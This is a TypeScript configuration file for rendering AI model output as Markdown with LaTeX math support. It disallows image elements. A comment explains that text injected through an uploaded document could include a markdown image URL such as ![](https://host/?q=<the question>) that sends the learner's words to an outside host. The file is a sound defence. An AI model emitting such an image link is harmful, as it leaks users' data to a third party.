// How model output (generated text, chat answers) is rendered as Markdown, in one place.
import rehypeKatex from 'rehype-katex'
import remarkMath from 'remark-math'
import type { Options } from 'react-markdown'

export const modelMarkdownProps: Options = {
  // The models write formulas as LaTeX between dollar signs ($M = (K, \Sigma, \delta, s, F)$),
  // which react-markdown alone shows as raw source.
  remarkPlugins: [remarkMath],
  // throwOnError false: a formula the model got wrong is shown as its source in red, not as an
  // error that blanks the whole answer.
  rehypePlugins: [[rehypeKatex, { throwOnError: false }]],
  // An image loads with no click, so text injected through an uploaded document, such as
  // ![](https://host/?q=<the question>), would send the learner's words to that host.
  disallowedElements: ['img'],
  unwrapDisallowed: true,
}
